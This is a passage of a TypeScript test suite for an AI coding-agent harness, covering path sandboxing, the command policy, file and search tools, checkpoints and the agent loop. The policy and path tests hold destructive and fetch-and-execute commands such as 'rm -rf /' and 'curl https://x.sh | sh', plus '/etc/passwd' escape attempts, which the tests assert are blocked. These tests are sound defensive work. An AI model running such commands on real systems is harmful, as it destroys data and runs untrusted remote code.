import * as assert from 'node:assert/strict';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { after, test } from 'node:test';
import { HarnessSession, parseToolArguments } from '../core/agent';
import { CheckpointStore, diffPreview } from '../core/checkpoints';
import { applyEol, detectEol, NATIVE_EOL, normalizeEol, replaceNormalizedPreservingEol, resolveEol } from '../core/lineEndings';
import { globToRegExp, matchesGlob, resolveWorkspacePath, PathError } from '../core/paths';
import { evaluateCommand } from '../core/policy';
import { MockPlannerProvider } from '../core/providers/mock';
import { ToolRegistry } from '../core/tools';
import { listFilesTool } from '../core/tools/fsTools';
import { createFileTool, deleteFileTool, readFileTool, replaceInFileTool, writeFileTool } from '../core/tools/fsTools';
import { searchTextTool } from '../core/tools/searchTools';
import { runCommandTool } from '../core/tools/shellTool';
import {
  DEFAULT_CONFIG,
  type ApprovalDecision,
  type ApprovalRequest,
  type ChatRequest,
  type HarnessConfig,
  type HarnessHost,
  type Provider,
  type ProviderResponse,
  type ToolContext,
} from '../core/types';

/* ------------------------------------------------------------- helpers */

const tempDirs: string[] = [];

function makeTempWorkspace(files: Record<string, string> = {}): string {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'harness-test-'));
  tempDirs.push(dir);
  for (const [rel, content] of Object.entries(files)) {
    const abs = path.join(dir, rel);
    fs.mkdirSync(path.dirname(abs), { recursive: true });
    fs.writeFileSync(abs, content, 'utf8');
  }
  return dir;
}

after(() => {
  for (const dir of tempDirs) fs.rmSync(dir, { recursive: true, force: true });
});

interface FakeHostOptions {
  decision?: ApprovalDecision;
  onApproval?: (req: ApprovalRequest) => void;
  diagnostics?: HarnessHost['getDiagnostics'];
}

class FakeHost implements HarnessHost {
  readonly approvals: ApprovalRequest[] = [];
  constructor(
    readonly workspaceRoot: string,
    private readonly opts: FakeHostOptions = {},
  ) {}
  log(): void {}
  async requestApproval(req: ApprovalRequest): Promise<ApprovalDecision> {
    this.approvals.push(req);
    this.opts.onApproval?.(req);
    return this.opts.decision ?? 'apply';
  }
  async getDiagnostics(): Promise<import('../core/types').Diagnostic[]> {
    return this.opts.diagnostics ? this.opts.diagnostics() : [];
  }
}

function makeContext(root: string, host: HarnessHost, config: Partial<HarnessConfig> = {}): ToolContext {
  const checkpoints = new CheckpointStore(true);
  return {
    root,
    host,
    config: { ...DEFAULT_CONFIG, ...config },
    checkpoints,
    approval: (req) => host.requestApproval(req),
  };
}

/* --------------------------------------------------------------- paths */

test('resolveWorkspacePath accepts relative paths and refuses escapes', () => {
  const root = makeTempWorkspace({ 'src/app.ts': 'export const a = 1;\n' });

  assert.equal(resolveWorkspacePath(root, 'src/app.ts').rel, 'src/app.ts');
  assert.equal(resolveWorkspacePath(root, './src/../src/app.ts').rel, 'src/app.ts');
  assert.equal(resolveWorkspacePath(root).rel, '.');
  assert.equal(resolveWorkspacePath(root, path.join(root, 'src/app.ts')).rel, 'src/app.ts');

  assert.throws(() => resolveWorkspacePath(root, '../outside.txt'), PathError);
  assert.throws(() => resolveWorkspacePath(root, '/etc/passwd'), PathError);
  assert.throws(() => resolveWorkspacePath(root, 'src/../../etc/passwd'), PathError);

  // Escape hatch used by the allowOutsideWorkspace setting.
  assert.equal(resolveWorkspacePath(root, '/etc/hosts', { allowOutside: true }).abs, '/etc/hosts');
});

test('resolveWorkspacePath blocks symlink escapes', () => {
  const root = makeTempWorkspace({ 'inside.txt': 'hi\n' });
  const outside = makeTempWorkspace({ 'secret.txt': 'top secret\n' });
  const linkPath = path.join(root, 'escape');
  try {
    fs.symlinkSync(outside, linkPath, 'dir');
  } catch {
    return; // symlinks unavailable (rare, but skip rather than fail)
  }
  assert.throws(() => resolveWorkspacePath(root, 'escape/secret.txt'), PathError);
});

test('glob helpers behave like the docs promise', () => {
  assert.ok(globToRegExp('*.ts').test('agent.ts'));
  assert.ok(!globToRegExp('*.ts').test('src/agent.ts'));
  assert.ok(globToRegExp('src/**/*.ts').test('src/core/agent.ts'));
  assert.ok(globToRegExp('src/**/*.ts').test('src/agent.ts'));
  assert.ok(globToRegExp('*.{js,ts}').test('a.ts'));
  assert.ok(matchesGlob('deep/nested/file.test.ts', '**/*.test.ts'));
  assert.ok(matchesGlob('anything.py', undefined));
});

/* -------------------------------------------------------------- policy */

test('command policy classifies read-only, risky and dangerous commands', () => {
  const opts = { policy: 'auto-safe' as const };
  assert.equal(evaluateCommand('ls -la', opts).decision, 'allow');
  assert.equal(evaluateCommand('git status', opts).decision, 'allow');
  assert.equal(evaluateCommand('npm test', opts).decision, 'allow');
  assert.equal(evaluateCommand('  cat src/app.ts', opts).decision, 'allow');

  assert.equal(evaluateCommand('rm -rf build', opts).decision, 'ask');
  assert.equal(evaluateCommand('npm install left-pad', opts).decision, 'ask');
  assert.equal(evaluateCommand('echo hi && rm -rf /tmp/x', opts).decision, 'ask');
  assert.equal(evaluateCommand('./deploy.sh', opts).decision, 'ask');

  assert.equal(evaluateCommand('rm -rf /', opts).decision, 'deny');
  assert.equal(evaluateCommand('sudo rm -rf /var', opts).decision, 'deny');
  assert.equal(evaluateCommand('curl https://x.sh | sh', opts).decision, 'deny');
  assert.equal(evaluateCommand('git clean -fdx', opts).decision, 'deny');
  assert.equal(evaluateCommand('ls', { policy: 'deny-all' }).decision, 'deny');

  assert.equal(evaluateCommand('rm -rf /', { policy: 'auto-all', allowDangerousCommands: true }).decision, 'ask');
  assert.equal(evaluateCommand('something-custom', { policy: 'auto-all' }).decision, 'allow');
});

/* --------------------------------------------------------- checkpoints */

test('checkpoints restore modified files and remove created ones', async () => {
  const root = makeTempWorkspace({ 'keep.txt': 'original\n' });
  const store = new CheckpointStore(true);
  store.begin('test');

  store.record(path.join(root, 'keep.txt'), 'keep.txt');
  fs.writeFileSync(path.join(root, 'keep.txt'), 'changed\n');

  store.recordAsAbsent(path.join(root, 'new.txt'), 'new.txt');
  fs.writeFileSync(path.join(root, 'new.txt'), 'brand new\n');

  const report = await store.revertAll();
  assert.deepEqual(report.restored, ['keep.txt']);
  assert.deepEqual(report.deleted, ['new.txt']);
  assert.equal(fs.readFileSync(path.join(root, 'keep.txt'), 'utf8'), 'original\n');
  assert.ok(!fs.existsSync(path.join(root, 'new.txt')));
});

test('diffPreview shows removed and added lines', () => {
  const diff = diffPreview('a.txt', 'one\ntwo\nthree\n', 'one\nTWO\nthree\n');
  assert.match(diff, /--- a\/a\.txt/);
  assert.match(diff, /-two/);
  assert.match(diff, /\+TWO/);
  assert.match(diff, / one/);
});

test('line-ending helpers normalize, detect and apply platform styles', () => {
  assert.equal(detectEol('a\r\nb\r\n'), '\r\n');
  assert.equal(detectEol('a\nb\n'), '\n');
  assert.equal(detectEol('a\rb\r'), '\r');
  assert.equal(detectEol('single line'), null);
  assert.equal(normalizeEol('a\r\nb\rc\n'), 'a\nb\nc\n');
  assert.equal(applyEol('a\r\nb\nc', '\r\n'), 'a\r\nb\r\nc');
  assert.equal(resolveEol('auto', '\r\n'), '\r\n');
  assert.equal(resolveEol('native', '\r\n'), NATIVE_EOL);
  assert.equal(resolveEol('crlf', '\n'), '\r\n');
});

/* --------------------------------------------------------------- tools */

test('write_file creates files with the right content and checkpoints them', async () => {
  const root = makeTempWorkspace();
  const host = new FakeHost(root);
  const ctx = makeContext(root, host);

  const res = await writeFileTool.run({ path: 'src/hello.py', content: 'print("hi")\n', mode: 'create' }, ctx);
  assert.equal(res.ok, true);
  assert.equal(fs.readFileSync(path.join(root, 'src/hello.py'), 'utf8'), 'print("hi")\n');
  assert.equal(host.approvals.length, 1);
  assert.equal(host.approvals[0].kind, 'write');
  assert.match(host.approvals[0].detail, /\+print\("hi"\)/);

  const again = await writeFileTool.run({ path: 'src/hello.py', content: 'x', mode: 'create' }, ctx);
  assert.equal(again.ok, false, 'mode:create must not clobber an existing file');

  await ctx.checkpoints.revertAll();
  assert.ok(!fs.existsSync(path.join(root, 'src/hello.py')));
});

test('create_file creates without overwriting and defaults to empty content', async () => {
  const root = makeTempWorkspace();
  const ctx = makeContext(root, new FakeHost(root));

  const created = await createFileTool.run({ path: 'notes.txt', content: 'hello\n' }, ctx);
  assert.equal(created.ok, true);
  assert.equal(fs.readFileSync(path.join(root, 'notes.txt'), 'utf8'), 'hello\n');

  const again = await createFileTool.run({ path: 'notes.txt', content: 'replaced' }, ctx);
  assert.equal(again.ok, false, 'create_file must not overwrite an existing file');
  assert.equal(fs.readFileSync(path.join(root, 'notes.txt'), 'utf8'), 'hello\n');

  const empty = await createFileTool.run({ path: 'empty.txt' }, ctx);
  assert.equal(empty.ok, true);
  assert.equal(fs.readFileSync(path.join(root, 'empty.txt'), 'utf8'), '');
});

test('write_file is skipped when the user rejects it', async () => {
  const root = makeTempWorkspace();
  const host = new FakeHost(root, { decision: 'reject' });
  const ctx = makeContext(root, host);
  const res = await writeFileTool.run({ path: 'blocked.txt', content: 'nope' }, ctx);
  assert.equal(res.ok, false);
  assert.ok(!fs.existsSync(path.join(root, 'blocked.txt')));
});

test('replace_in_file requires an exact match and edits in place', async () => {
  const root = makeTempWorkspace({ 'app.js': 'const a = 1;\nconst b = 2;\nconsole.log(a + b);\n' });
  const ctx = makeContext(root, new FakeHost(root));

  const miss = await replaceInFileTool.run({ path: 'app.js', old_text: 'const c = 3;', new_text: 'x' }, ctx);
  assert.equal(miss.ok, false);
  assert.match(miss.content, /not found/);

  const hit = await replaceInFileTool.run({ path: 'app.js', old_text: 'const b = 2;', new_text: 'const b = 42;' }, ctx);
  assert.equal(hit.ok, true);
  assert.equal(fs.readFileSync(path.join(root, 'app.js'), 'utf8'), 'const a = 1;\nconst b = 42;\nconsole.log(a + b);\n');

  const twice = await replaceInFileTool.run(
    { path: 'app.js', old_text: 'const', new_text: 'let', count: -1 },
    ctx,
  );
  assert.equal(twice.ok, true);
  assert.match(fs.readFileSync(path.join(root, 'app.js'), 'utf8'), /^let a = 1;\nlet b = 42;/);
});

test('replace_in_file rejects ambiguous snippets unless count is explicit', async () => {
  const original = '@media (max-width: 1200px) {\r\n  .first { color: red; }\r\n}\r\n' +
    '@media (max-width: 1200px) {\r\n  .second { color: blue; }\r\n';
  const root = makeTempWorkspace({ 'style.css': original });
  const host = new FakeHost(root);
  const ctx = makeContext(root, host);
  const snippet = '@media (max-width: 1200px) {\n';

  const ambiguous = await replaceInFileTool.run({ path: 'style.css', old_text: snippet, new_text: 'changed\n' }, ctx);
  assert.equal(ambiguous.ok, false);
  assert.match(ambiguous.content, /matches 2 occurrences.*No changes were made/);
  assert.equal(host.approvals.length, 0);
  assert.equal(fs.readFileSync(path.join(root, 'style.css'), 'utf8'), original);

  const targeted = await replaceInFileTool.run({
    path: 'style.css',
    old_text: snippet + '  .second { color: blue; }\n',
    new_text: snippet + '  .second { color: blue; }\n}\n',
  }, ctx);
  assert.equal(targeted.ok, true);
  assert.equal(fs.readFileSync(path.join(root, 'style.css'), 'utf8'), original + '}\r\n');

  const explicit = await replaceInFileTool.run({ path: 'style.css', old_text: snippet, new_text: 'changed\n', count: 1 }, ctx);
  assert.equal(explicit.ok, true);
  assert.match(explicit.content, /1 further occurrence\(s\) left untouched/);
  assert.ok(fs.readFileSync(path.join(root, 'style.css'), 'utf8').startsWith('changed\r\n'));
});

test('replace_in_file validates count and supports line-ending independent explicit replace all', async () => {
  const original = 'alpha\r\nbeta\r\nalpha\r\nbeta\r\n';
  const root = makeTempWorkspace({ 'windows.txt': original });
  const ctx = makeContext(root, new FakeHost(root));
  for (const count of [0, -2, 1.5, NaN, Infinity]) {
    const invalid = await replaceInFileTool.run({ path: 'windows.txt', old_text: 'alpha', new_text: 'x', count }, ctx);
    assert.equal(invalid.ok, false);
    assert.match(invalid.content, /positive integer or -1/);
    assert.equal(fs.readFileSync(path.join(root, 'windows.txt'), 'utf8'), original);
  }
  const all = await replaceInFileTool.run({ path: 'windows.txt', old_text: 'alpha\nbeta', new_text: 'one\ntwo', count: -1 }, ctx);
  assert.equal(all.ok, true);
  assert.equal(fs.readFileSync(path.join(root, 'windows.txt'), 'utf8'), 'one\r\ntwo\r\none\r\ntwo\r\n');
});

test('file tools edit CRLF files with LF snippets and preserve their style', async () => {
  const root = makeTempWorkspace({ 'windows.txt': 'alpha\r\nbeta\r\ngamma\r\n' });
  const host = new FakeHost(root);
  const ctx = makeContext(root, host);

  const read = await readFileTool.run({ path: 'windows.txt' }, ctx);
  assert.equal(read.ok, true);
  assert.match(read.content, /alpha\n.*beta\n.*gamma/);
  assert.match(read.content, /CRLF line endings shown as LF/);
  assert.ok(!read.content.includes('\r'), 'read_file should return a canonical LF view');

  const edited = await replaceInFileTool.run(
    { path: 'windows.txt', old_text: 'alpha\nbeta', new_text: 'one\ntwo' },
    ctx,
  );
  assert.equal(edited.ok, true);
  assert.equal(fs.readFileSync(path.join(root, 'windows.txt'), 'utf8'), 'one\r\ntwo\r\ngamma\r\n');

  const overwritten = await writeFileTool.run({ path: 'windows.txt', content: 'a\nb\n' }, ctx);
  assert.equal(overwritten.ok, true);
  assert.equal(fs.readFileSync(path.join(root, 'windows.txt'), 'utf8'), 'a\r\nb\r\n');

  const fresh = await writeFileTool.run({ path: 'fresh.txt', content: 'a\r\nb' }, ctx);
  assert.equal(fresh.ok, true);
  assert.equal(fs.readFileSync(path.join(root, 'fresh.txt'), 'utf8'), `a${NATIVE_EOL}b`);

  const forced = await writeFileTool.run(
    { path: 'forced.txt', content: 'a\nb', mode: 'create' },
    makeContext(root, host, { lineEndings: 'crlf' }),
  );
  assert.equal(forced.ok, true);
  assert.equal(fs.readFileSync(path.join(root, 'forced.txt'), 'utf8'), 'a\r\nb');
});

test('read_file refuses oversized and binary files and numbers lines', async () => {
  const root = makeTempWorkspace({ 'big.txt': 'x'.repeat(5000), 'bin.dat': 'a\u0000b' });
  const ctx = makeContext(root, new FakeHost(root), { maxFileBytes: 1000 });

  const big = await readFileTool.run({ path: 'big.txt' }, ctx);
  assert.equal(big.ok, false);
  assert.match(big.content, /larger than/);

  const bin = await readFileTool.run({ path: 'bin.dat' }, ctx);
  assert.equal(bin.ok, false);

  const small = await readFileTool.run({ path: 'big.txt' }, makeContext(root, new FakeHost(root), { maxFileBytes: 10_000 }));
  assert.equal(small.ok, true);
  assert.match(small.content, /1\| x{10}/);
});

test('list_files skips node_modules and honours globs', async () => {
  const root = makeTempWorkspace({
    'src/index.ts': 'a',
    'src/util/helper.ts': 'b',
    'node_modules/dep/index.js': 'c',
    'README.md': 'docs',
  });
  const ctx = makeContext(root, new FakeHost(root));

  const all = await listFilesTool.run({ max_depth: 4 }, ctx);
  assert.match(all.content, /src\/index\.ts/);
  assert.ok(!all.content.includes('node_modules'), 'dependency folders must be skipped');

  const globbed = await listFilesTool.run({ glob: '**/*.ts', max_depth: 4 }, ctx);
  assert.match(globbed.content, /src\/util\/helper\.ts/);
  assert.ok(!globbed.content.includes('README.md'));
});

test('search_text finds matches with file and line numbers', async () => {
  const root = makeTempWorkspace({
    'src/a.ts': 'export function parseThing() {}\n',
    'src/b.ts': 'import { parseThing } from "./a";\n',
    'node_modules/skip/index.js': 'parseThing\n',
  });
  const ctx = makeContext(root, new FakeHost(root));

  const res = await searchTextTool.run({ query: 'parseThing' }, ctx);
  assert.equal(res.ok, true);
  assert.match(res.content, /src\/a\.ts:1: export function parseThing/);
  assert.match(res.content, /src\/b\.ts:1: import \{ parseThing \}/);
  assert.ok(!res.content.includes('node_modules'));

  const none = await searchTextTool.run({ query: 'doesNotExistAnywhere' }, ctx);
  assert.match(none.content, /No matches/);
});

test('run_command reports exit codes, output and refuses dangerous commands', async () => {
  const root = makeTempWorkspace();
  const host = new FakeHost(root);
  const ctx = makeContext(root, host, { commandPolicy: 'auto-safe' });

  const good = await runCommandTool.run({ command: 'echo harness-ok' }, ctx);
  assert.equal(good.ok, true);
  assert.match(good.content, /harness-ok/);
  assert.match(good.content, /exit code 0/);
  assert.equal(host.approvals.length, 0, 'read-only commands should not need approval');

  const bad = await runCommandTool.run({ command: 'ls /definitely-not-here-12345' }, ctx);
  assert.equal(bad.ok, false, 'non-zero exit must be reported as a failure');

  const blocked = await runCommandTool.run({ command: 'rm -rf /' }, ctx);
  assert.equal(blocked.ok, false);
  assert.match(blocked.content, /refused/i);

  const gated = await runCommandTool.run({ command: 'rm -rf ./build' }, ctx);
  assert.equal(gated.ok, true);
  assert.equal(host.approvals.length, 1, 'destructive commands must ask first');
});

test('run_command respects cwd inside the workspace and rejects escapes', async () => {
  const root = makeTempWorkspace({ 'sub/.keep': '' });
  const ctx = makeContext(root, new FakeHost(root));
  const res = await runCommandTool.run({ command: 'pwd', cwd: 'sub' }, ctx);
  assert.equal(res.ok, true);
  assert.match(res.content, /sub/);

  const escape = await runCommandTool.run({ command: 'pwd', cwd: '../..' }, ctx);
  assert.equal(escape.ok, false);
  assert.match(escape.content, /outside the workspace/);
});

test('delete_file asks for confirmation and is revertible', async () => {
  const root = makeTempWorkspace({ 'doomed.txt': 'bye\n' });
  const host = new FakeHost(root);
  const ctx = makeContext(root, host);

  const res = await deleteFileTool.run({ path: 'doomed.txt', reason: 'test' }, ctx);
  assert.equal(res.ok, true);
  assert.ok(!fs.existsSync(path.join(root, 'doomed.txt')));
  assert.equal(host.approvals[0].kind, 'delete');

  await ctx.checkpoints.revertAll();
  assert.equal(fs.readFileSync(path.join(root, 'doomed.txt'), 'utf8'), 'bye\n');
});

/* --------------------------------------------------------------- agent */

test('parseToolArguments tolerates fenced or padded JSON', () => {
  assert.deepEqual(parseToolArguments('{"path":"a"}'), { path: 'a' });
  assert.deepEqual(parseToolArguments(''), {});
  assert.deepEqual(parseToolArguments('```json\n{"path":"a"}\n```'), { path: 'a' });
  assert.deepEqual(parseToolArguments('Sure! {"path":"a"} there you go'), { path: 'a' });
  assert.throws(() => parseToolArguments('not json at all'));
});

test('agent loop runs a full task with the mock provider', async () => {
  const root = makeTempWorkspace({ 'README.md': '# demo\n' });
  fs.writeFileSync(path.join(root, 'agent.md'), '---\ntools: [read, search, edit, execute]\n---\n');
  const host = new FakeHost(root);
  const events: string[] = [];
  const session = new HarnessSession({
    host,
    config: { ...DEFAULT_CONFIG, provider: 'mock' },
    provider: new MockPlannerProvider(),
  });

  const result = await session.runTask('create a python script called greet.py that prints hello', (e) => events.push(e.type));

  assert.equal(result.outcome, 'complete');
  assert.ok(fs.existsSync(path.join(root, 'greet.py')), 'the script should have been created');
  assert.ok(result.filesChanged.includes('greet.py'));
  assert.ok(events.includes('tool-start'));
  assert.ok(events.includes('done'));
  assert.ok(session.transcript.some((m) => m.role === 'assistant'));

  // The whole task can be undone.
  const revert = await session.revertLastTask();
  assert.ok(revert.deleted.includes('greet.py'));
  assert.ok(!fs.existsSync(path.join(root, 'greet.py')));
});

test('agent surfaces a rejected edit to the model instead of failing the task', async () => {
  const root = makeTempWorkspace();
  fs.writeFileSync(path.join(root, 'agent.md'), '---\ntools: [read, search, edit, execute]\n---\n');
  const host = new FakeHost(root, { decision: 'reject' });
  const session = new HarnessSession({
    host,
    config: { ...DEFAULT_CONFIG, provider: 'mock' },
    provider: new MockPlannerProvider(),
  });

  const result = await session.runTask('create a file called reject_me.py that prints hi', () => {});
  assert.ok(['complete', 'max-steps'].includes(result.outcome));
  assert.ok(!fs.existsSync(path.join(root, 'reject_me.py')));
  assert.ok(host.approvals.length > 0, 'the user should have been asked');
});

test('a rejected edit is not counted as a file change', async () => {
  const root = makeTempWorkspace();
  fs.writeFileSync(path.join(root, 'agent.md'), '---\ntools: [read, search, edit, execute]\n---\n');
  const host = new FakeHost(root, { decision: 'reject' });
  const session = new HarnessSession({
    host,
    config: { ...DEFAULT_CONFIG, provider: 'mock' },
    provider: new MockPlannerProvider(),
  });

  const result = await session.runTask('create a file called nope.py that prints hi', () => {});
  assert.deepEqual(result.filesChanged, [], 'nothing was written, so nothing changed');
  assert.ok(host.approvals.length > 0);

  const revert = await session.revertLastTask();
  assert.deepEqual(revert.restored, []);
  assert.deepEqual(revert.deleted, []);
});

test('editPolicy=auto applies edits without prompting', async () => {
  const root = makeTempWorkspace();
  fs.writeFileSync(path.join(root, 'agent.md'), '---\ntools: [read, search, edit, execute]\n---\n');
  const host = new FakeHost(root, { decision: 'reject' });
  const session = new HarnessSession({
    host,
    config: { ...DEFAULT_CONFIG, provider: 'mock', editPolicy: 'auto', context: { ...DEFAULT_CONFIG.context, diagnostics: false } },
    provider: new MockPlannerProvider(),
  });

  await session.runTask('create a file called auto.py that prints hi', () => {});
  assert.ok(fs.existsSync(path.join(root, 'auto.py')), 'auto policy must write without asking');
  assert.equal(host.approvals.length, 0);
});

/* ------------------------------------------------------------- registry */

test('the default registry exposes the documented tools', () => {
  const registry = new ToolRegistry();
  for (const name of [
    'list_files',
    'read_file',
    'search_text',
    'create_file',
    'write_file',
    'replace_in_file',
    'delete_file',
    'run_command',
    'get_diagnostics',
    'open_file',
  ]) {
    assert.ok(registry.has(name), `missing tool ${name}`);
  }
  assert.equal(registry.specs().length, registry.size);
  for (const spec of registry.specs()) {
    assert.ok(spec.description.length > 20, `${spec.name} needs a useful description`);
    assert.equal(spec.parameters.type, 'object');
  }
});

/* -------------------------------------------------- agent file selection */

/** Records the requests a session sends, so the prompt itself can be inspected. */
class CapturingProvider implements Provider {
  readonly id = 'capture';
  readonly label = 'capture';
  readonly requests: ChatRequest[] = [];

  async chat(request: ChatRequest): Promise<ProviderResponse> {
    this.requests.push(request);
    return { text: 'Done.', toolCalls: [] };
  }

  systemPrompt(index: number): string {
    const message = this.requests[index].messages.find((entry) => entry.role === 'system');
    return String(message?.content ?? '');
  }
}

test('a pinned agent selection decides which instructions reach the model', async () => {
  const root = makeTempWorkspace({ 'agent.md': 'root rules', '.agents/review.md': 'review rules' });
  const provider = new CapturingProvider();
  const session = new HarnessSession({
    host: new FakeHost(root),
    config: { ...DEFAULT_CONFIG, provider: 'mock' },
    provider,
    agentSelection: ['agent.md'],
  });

  const events: any[] = [];
  await session.runTask('do the thing', (event) => events.push(event));

  const system = provider.systemPrompt(0);
  assert.match(system, /root rules/, 'the pinned file is sent');
  assert.doesNotMatch(system, /review rules/, 'the unpinned file is not');
  assert.match(system, /pinned this selection: 1 of 2/);

  const event = events.find((entry) => entry.type === 'agent-files');
  assert.deepEqual(event.files.map((file: { displayPath: string }) => file.displayPath), ['agent.md']);
  assert.equal(event.available, 2, 'the panel still knows how many were discovered');

  // Switching mid-session applies to the next task.
  session.setAgentSelection(['.agents/review.md']);
  await session.runTask('again', () => {});
  assert.match(provider.systemPrompt(1), /review rules/);
  assert.doesNotMatch(provider.systemPrompt(1), /root rules/);

  // null means everything again.
  session.setAgentSelection(null);
  await session.runTask('one more', () => {});
  const third = provider.systemPrompt(2);
  assert.match(third, /root rules/);
  assert.match(third, /review rules/);
  assert.doesNotMatch(third, /pinned this selection/);
});

test('replace preserves untouched mixed endings, Unicode and BOM; uses local endings for inserted lines', async () => {
  const original = '\uFEFF😀 top\r\nfirst\nneedle\rsecond\r\nlast\n';
  const root = makeTempWorkspace({ 'mixed.txt': original });
  const ctx = makeContext(root, new FakeHost(root));
  const result = await replaceInFileTool.run({ path: 'mixed.txt', old_text: 'needle\nsecond', new_text: 'one\ntwo' }, ctx);
  assert.equal(result.ok, true);
  assert.match(result.content, /Mixed line endings/);
  assert.equal(fs.readFileSync(path.join(root, 'mixed.txt'), 'utf8'), '\uFEFF😀 top\r\nfirst\none\rtwo\r\nlast\n');
});

test('multiple replacements preserve each location, final newline, and ambiguity safeguards', async () => {
  const original = 'a\r\nX\r\nb\nX\nc\rX\rend';
  const root = makeTempWorkspace({ 'mixed.txt': original });
  const ctx = makeContext(root, new FakeHost(root));
  const ambiguous = await replaceInFileTool.run({ path: 'mixed.txt', old_text: 'X', new_text: 'foo\nbar' }, ctx);
  assert.equal(ambiguous.ok, false);
  assert.equal(fs.readFileSync(path.join(root, 'mixed.txt'), 'utf8'), original);
  const result = await replaceInFileTool.run({ path: 'mixed.txt', old_text: 'X', new_text: 'foo\nbar', count: -1 }, ctx);
  assert.equal(result.ok, true);
  assert.equal(fs.readFileSync(path.join(root, 'mixed.txt'), 'utf8'), 'a\r\nfoo\r\nbar\r\nb\nfoo\nbar\nc\rfoo\rbar\rend');
});

test('append auto preserves existing mixed endings; explicit replacement override normalizes file', async () => {
  const root = makeTempWorkspace({ 'mixed.txt': 'a\r\nb\nc\r', 'forced.txt': 'a\r\nb\nc\r' });
  const ctx = makeContext(root, new FakeHost(root));
  const append = await writeFileTool.run({ path: 'mixed.txt', content: 'd\ne', mode: 'append' }, ctx);
  assert.equal(append.ok, true);
  assert.equal(fs.readFileSync(path.join(root, 'mixed.txt'), 'utf8'), 'a\r\nb\nc\rd\r\ne');
  const force = await replaceInFileTool.run({ path: 'forced.txt', old_text: 'b', new_text: 'B' }, makeContext(root, new FakeHost(root), { lineEndings: 'lf' }));
  assert.equal(force.ok, true);
  assert.equal(fs.readFileSync(path.join(root, 'forced.txt'), 'utf8'), 'a\nB\nc\n');
});

test('replace rejects invalid UTF-8 and files changed while awaiting approval', async () => {
  const root = makeTempWorkspace({ 'bad.bin': 'a', 'race.txt': 'old\r\n' });
  const invalid = Buffer.from([0x61, 0xff, 0x0a]);
  fs.writeFileSync(path.join(root, 'bad.bin'), invalid);
  const bad = await replaceInFileTool.run({ path: 'bad.bin', old_text: 'a', new_text: 'x' }, makeContext(root, new FakeHost(root)));
  assert.equal(bad.ok, false);
  assert.match(bad.content, /not valid UTF-8/);
  assert.deepEqual(fs.readFileSync(path.join(root, 'bad.bin')), invalid);
  const host = new FakeHost(root, { onApproval() { fs.writeFileSync(path.join(root, 'race.txt'), 'user changed\r\n'); } });
  const race = await replaceInFileTool.run({ path: 'race.txt', old_text: 'old', new_text: 'new' }, makeContext(root, host));
  assert.equal(race.ok, false);
  assert.match(race.content, /changed since/);
  assert.equal(fs.readFileSync(path.join(root, 'race.txt'), 'utf8'), 'user changed\r\n');
});

test('search behaves identically across LF, CRLF, CR and mixed line endings', async () => {
  const root = makeTempWorkspace({ 'lf.txt': 'one\nborder-radius: 12px\nlast\n', 'crlf.txt': 'one\r\nborder-radius: 12px\r\nlast\r\n', 'cr.txt': 'one\rborder-radius: 12px\rlast\r', 'mixed.txt': 'one\r\nborder-radius: 12px\nlast\r' });
  const ctx = makeContext(root, new FakeHost(root));
  const result = await searchTextTool.run({ query: 'border-radius:\\s+\\d+px', is_regex: true }, ctx);
  assert.equal(result.ok, true);
  for (const file of ['lf.txt', 'crlf.txt', 'cr.txt', 'mixed.txt']) assert.match(result.content, new RegExp(`${file}:2: border-radius`));
  assert.match(result.content, /line-by-line; JavaScript regex; line endings normalized to LF/);
});

test('multiline search supports normalized literal and regex matches and remains opt-in', async () => {
  const root = makeTempWorkspace({ 'sample.txt': 'alpha\r\nbeta\rgamma\nlast' });
  const ctx = makeContext(root, new FakeHost(root));
  const regular = await searchTextTool.run({ path: 'sample.txt', query: 'alpha\\s+beta', is_regex: true }, ctx);
  assert.match(regular.content, /No matches/);
  const multi = await searchTextTool.run({ path: 'sample.txt', query: '^alpha\\s+beta\\s+gamma$', is_regex: true, multiline: true, context_lines: 1 }, ctx);
  assert.match(multi.content, /sample.txt:1: alpha/);
  assert.match(multi.content, /sample.txt:2: beta/);
  assert.match(multi.content, /sample.txt:3: gamma/);
  assert.match(multi.content, /sample.txt-4- last/);
  assert.match(multi.content, /multiline; JavaScript regex/);
  const literal = await searchTextTool.run({ path: 'sample.txt', query: 'alpha\r\nbeta\rgamma', multiline: true }, ctx);
  assert.match(literal.content, /1 match\(es\)/);
  const noDotAll = await searchTextTool.run({ path: 'sample.txt', query: 'alpha.*beta', is_regex: true, multiline: true }, ctx);
  assert.match(noDotAll.content, /No matches/);
  const emptyMatches = await searchTextTool.run({ path: 'sample.txt', query: '^', is_regex: true, multiline: true, max_results: 3 }, ctx);
  assert.match(emptyMatches.content, /3\+ match\(es\)/);
  assert.match(emptyMatches.content, /Stopped at the 3-match limit/);
});

test('search explains skipped files, binary files, output limits and invalid regex', async () => {
  const root = makeTempWorkspace({ '.hidden.txt': 'needle', 'big.txt': 'needle' + 'x'.repeat(100), 'small.txt': 'needle\nneedle\n', 'binary.txt': 'needle\u0000' });
  const ctx = makeContext(root, new FakeHost(root), { maxFileBytes: 40 });
  const result = await searchTextTool.run({ query: 'needle', max_results: 1 }, ctx);
  assert.match(result.content, /skipped by filters/);
  assert.match(result.content, /binary file\(s\) skipped/);
  assert.match(result.content, /Stopped at the 1-match limit/);
  const tooLarge = await searchTextTool.run({ query: 'needle', path: 'big.txt' }, ctx);
  assert.match(tooLarge.content, /specified file exceeds the 40-byte file size limit/);
  const malformed = await searchTextTool.run({ query: '[', is_regex: true }, ctx);
  assert.equal(malformed.ok, false);
  assert.match(malformed.content, /Invalid regular expression/);
  const manyLines = makeTempWorkspace({ 'many.txt': Array(35).fill('x').join('\n') });
  const clipped = await searchTextTool.run({ query: 'x[\\s\\S]*x', is_regex: true, multiline: true }, makeContext(manyLines, new FakeHost(manyLines)));
  assert.match(clipped.content, /Some matching or context lines were omitted/);
});

test('search reports depth limits, non-UTF-8 files, context and cancellation', async () => {
  const deep = Array(14).fill('dir').join('/') + '/hidden.txt';
  const root = makeTempWorkspace({ [deep]: 'needle', 'context.txt': 'before\r\nneedle\nafter\r' });
  fs.writeFileSync(path.join(root, 'encoded.txt'), Buffer.from([0x6e, 0xff, 0x0a]));
  const ctx = makeContext(root, new FakeHost(root));
  const result = await searchTextTool.run({ query: 'needle', context_lines: 1 }, ctx);
  assert.match(result.content, /context.txt-1- before/);
  assert.match(result.content, /context.txt:2: needle/);
  assert.match(result.content, /context.txt-3- after/);
  assert.match(result.content, /depth limit \(12\)/);
  assert.match(result.content, /non-UTF-8 file\(s\) skipped/);
